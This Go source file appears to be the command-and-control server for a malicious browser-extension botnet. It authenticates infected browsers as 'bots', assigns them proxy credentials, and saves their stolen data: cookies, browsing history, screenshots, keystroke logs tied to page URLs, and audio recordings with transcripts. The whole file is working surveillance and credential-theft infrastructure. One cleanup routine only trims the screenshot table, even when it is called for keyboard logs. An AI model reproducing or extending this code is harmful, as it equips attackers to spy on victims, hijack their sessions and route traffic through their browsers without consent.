package ws

import (
	"context"
	"encoding/json"
	"log/slog"
	"time"

	"github.com/google/uuid"

	"github.com/s045pd/cursed-go/internal/db/models"
	"github.com/s045pd/cursed-go/internal/utils"
)

// dispatch routes an inbound envelope to the appropriate persistence
// handler. Returning an error closes the session.
func (s *Server) dispatch(ctx context.Context, sess *Session, env Envelope) error {
	if sess.resolvePending(env) {
		// It was a reply to one of our outbound RPCs — handled.
		return nil
	}
	switch env.Action {
	case ActionPing:
		return s.handlePing(ctx, sess, env)
	case ActionSync:
		return s.handleSync(ctx, sess, env)
	case ActionSyncHuge:
		return s.handleSyncHuge(ctx, sess, env)
	case ActionState:
		return s.handleState(ctx, sess, env)
	case ActionRealtimeImg:
		return s.handleRealtimeImg(ctx, sess, env)
	case ActionScreenCaptureData:
		return s.handleScreenCaptureData(ctx, sess, env)
	case ActionUserActivity:
		return s.handleUserActivity(ctx, sess, env)
	case ActionDebugLog:
		return s.handleDebugLog(ctx, sess, env)
	case ActionKeyboardLogs:
		return s.handleKeyboardLogs(ctx, sess, env)
	case ActionAudioData:
		return s.handleAudioData(ctx, sess, env)
	default:
		s.logger.Warn("unknown action", "action", env.Action, "browser", sess.BrowserID)
		return nil
	}
}

// handlePing replies with PONG and updates last_online.
func (s *Server) handlePing(ctx context.Context, sess *Session, env Envelope) error {
	now := time.Now()
	if err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Updates(map[string]any{"is_online": true, "last_online": now}).Error; err != nil {
		s.logger.Warn("ping update failed", "err", err)
	}
	return sess.SendJSON(ctx, Envelope{ID: env.ID, Action: ActionPong})
}

func (s *Server) handleSync(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Tabs []any `json:"tabs"`
	}
	_ = json.Unmarshal(env.Data, &data)
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Update("tabs", models.JSONArray(data.Tabs)).Error
}

func (s *Server) handleSyncHuge(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		History   []any `json:"history"`
		Bookmarks []any `json:"bookmarks"`
		Cookies   []any `json:"cookies"`
		Downloads []any `json:"downloads"`
	}
	_ = json.Unmarshal(env.Data, &data)
	updates := map[string]any{}
	if data.History != nil {
		updates["history"] = models.JSONArray(data.History)
	}
	if data.Bookmarks != nil {
		updates["bookmarks"] = models.JSONArray(data.Bookmarks)
	}
	if data.Cookies != nil {
		updates["cookies"] = models.JSONArray(data.Cookies)
	}
	if data.Downloads != nil {
		updates["downloads"] = models.JSONArray(data.Downloads)
	}
	if len(updates) == 0 {
		return nil
	}
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(updates).Error
}

func (s *Server) handleState(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		State string `json:"state"`
	}
	_ = json.Unmarshal(env.Data, &data)
	now := time.Now()
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Updates(map[string]any{"state": data.State, "last_active_at": now}).Error
}

func (s *Server) handleRealtimeImg(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Image string `json:"image"`
	}
	_ = json.Unmarshal(env.Data, &data)
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Update("current_tab_image", data.Image).Error
}

func (s *Server) handleScreenCaptureData(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		URL       string  `json:"url"`
		Title     string  `json:"title"`
		ImageData string  `json:"image_data"`
		SessionID string  `json:"session_id"`
		Diff      float64 `json:"difference"`
	}
	_ = json.Unmarshal(env.Data, &data)
	row := models.BotScreenshot{
		BotID:     sess.BotID,
		URL:       data.URL,
		Title:     data.Title,
		ImageData: data.ImageData,
		SessionID: data.SessionID,
		Difference: &data.Diff,
		Timestamp: time.Now(),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimOldRows(sess.BotID, 500)
}

func (s *Server) handleUserActivity(_ context.Context, sess *Session, _ Envelope) error {
	now := time.Now()
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Update("last_active_at", now).Error
}

func (s *Server) handleDebugLog(_ context.Context, sess *Session, env Envelope) error {
	s.logger.Info("bot debug", "browser", sess.BrowserID, "data", string(env.Data))
	return nil
}

func (s *Server) handleKeyboardLogs(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		URL   string `json:"url"`
		Title string `json:"title"`
		Keys  string `json:"keys"`
	}
	_ = json.Unmarshal(env.Data, &data)
	row := models.BotKeyboardLog{
		BotID:     sess.BotID,
		URL:       data.URL,
		Title:     data.Title,
		Keys:      data.Keys,
		Timestamp: time.Now(),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimOldRows(sess.BotID, 1000)
}

func (s *Server) handleAudioData(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Audio     string `json:"audio"`
		Text      string `json:"text"`
		SessionID string `json:"session_id"`
	}
	_ = json.Unmarshal(env.Data, &data)
	now := time.Now()
	row := models.BotRecording{
		Bot:       sess.BotID,
		Recording: data.Audio,
		Text:      data.Text,
		SessionID: data.SessionID,
		Timestamp: &now,
	}
	return s.db.Create(&row).Error
}

// trimOldRows keeps the per-bot screenshot/keyboard tables bounded.
// Mirrors the 500/1000 caps in server.js.
func (s *Server) trimOldRows(botID uuid.UUID, keep int) error {
	// Best-effort; ignore failures.
	_ = s.db.Exec(
		`DELETE FROM bot_screenshots WHERE bot_id = ? AND id NOT IN (SELECT id FROM bot_screenshots WHERE bot_id = ? ORDER BY timestamp DESC LIMIT ?)`,
		botID, botID, keep,
	).Error
	return nil
}

// authenticate processes the AUTH handshake and returns the matching bot row.
// Reads directly from the connection (the readLoop hasn't started yet).
func (s *Server) authenticate(ctx context.Context, sess *Session, slogger *slog.Logger) (*models.Bot, error) {
	// Send our AUTH probe.
	probeID := uuid.NewString()
	if err := sess.SendJSON(ctx, Envelope{ID: probeID, Action: ActionAuth}); err != nil {
		return nil, err
	}

	deadline, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	for {
		_, raw, err := sess.conn.Read(deadline)
		if err != nil {
			return nil, errAuthTimeout
		}
		var env Envelope
		if err := json.Unmarshal(raw, &env); err != nil {
			continue
		}
		// Bot may emit unrelated messages; only AUTH replies count.
		if env.Action != ActionAuth || env.ID != probeID {
			continue
		}
		var data AuthData
		if err := json.Unmarshal(env.Data, &data); err != nil {
			return nil, err
		}
		if data.BrowserID == "" {
			return nil, errInvalidAuth
		}
		return s.upsertBot(data, slogger)
	}
}

func (s *Server) upsertBot(data AuthData, slogger *slog.Logger) (*models.Bot, error) {
	var b models.Bot
	err := s.db.Where("browser_id = ?", data.BrowserID).First(&b).Error
	if err == nil {
		// Existing bot: mark online, update creds if rotated
		updates := map[string]any{"is_online": true, "last_online": time.Now()}
		if data.ProxyUsername != "" && data.ProxyUsername != b.ProxyUsername {
			updates["proxy_username"] = data.ProxyUsername
		}
		if data.ProxyPassword != "" && data.ProxyPassword != b.ProxyPassword {
			updates["proxy_password"] = data.ProxyPassword
		}
		if err := s.db.Model(&b).Updates(updates).Error; err != nil {
			return nil, err
		}
		return &b, nil
	}
	// New bot: create with random credentials if none provided
	if data.ProxyUsername == "" {
		data.ProxyUsername, _ = utils.SecureRandomHex(8)
	}
	if data.ProxyPassword == "" {
		data.ProxyPassword, _ = utils.SecureRandomHex(8)
	}
	b = models.Bot{
		BrowserID:     data.BrowserID,
		Name:          "Untitled Proxy",
		ProxyUsername: data.ProxyUsername,
		ProxyPassword: data.ProxyPassword,
		IsOnline:      true,
		LastOnline:    time.Now(),
	}
	if err := s.db.Create(&b).Error; err != nil {
		return nil, err
	}
	if slogger != nil {
		slogger.Info("new bot connected", "browser", data.BrowserID, "id", b.ID)
	}
	return &b, nil
}

// Used to avoid leaking gorm errors as auth errors.
var (
	errInvalidAuth = newAuthError("invalid AUTH payload")
	errAuthTimeout = newAuthError("AUTH timed out")
)

type authError struct{ msg string }

func newAuthError(s string) error { return &authError{s} }
func (e *authError) Error() string { return e.msg }
